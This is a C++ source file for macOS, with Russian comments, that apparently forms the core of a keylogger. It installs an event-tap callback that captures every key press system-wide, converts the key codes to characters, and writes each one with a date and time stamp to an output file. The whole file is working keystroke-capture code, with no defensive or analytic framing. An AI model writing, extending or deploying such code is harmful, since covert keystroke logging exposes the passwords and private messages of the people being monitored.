#include "event_listener.h"

using namespace std;

wchar_t keyCodeToChar(int keyCode) {
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = reinterpret_cast<const UCKeyboardLayout *>(CFDataGetBytePtr(layoutData));

    UInt32 deadKeyState = 0;
    UniCharCount maxStringLength = 255;
    UniCharCount actualStringLength = 0;
    UniChar unicodeString[maxStringLength];

    OSStatus status = UCKeyTranslate(
        keyboardLayout,
        keyCode,
        kUCKeyActionDown,
        0,
        LMGetKbdType(),
        kUCKeyTranslateNoDeadKeysBit,
        &deadKeyState,
        maxStringLength,
        &actualStringLength,
        unicodeString
    );

    if (status != noErr) {
        // cerr << "Ошибка при преобразовании кода клавиши в символ." << endl;
        return L'\0';
    }

    wchar_t result = unicodeString[0];

    CFRelease(currentKeyboard);

    return result;
}


CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    // Проверяем, что это событие нажатия клавиши
    if (type == kCGEventKeyDown) {
        // Получаем код нажатой клавиши
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        // Преобразуем код клавиши в символ
        wchar_t keyChar = keyCodeToChar(keyCode);

        string date_time = getTimeStamp(string("%d-%m-%Y").c_str());
        string time_stamp = getTimeStamp(string("%H:%M:%S").c_str());
        wstring key_string = L"=KEY=" + wstring(1, keyChar);
        string info_string = "=DATE=" + date_time + "=TIME=" + time_stamp;
        WriteToOutputFile(key_string, info_string);
    }

    return event;
}
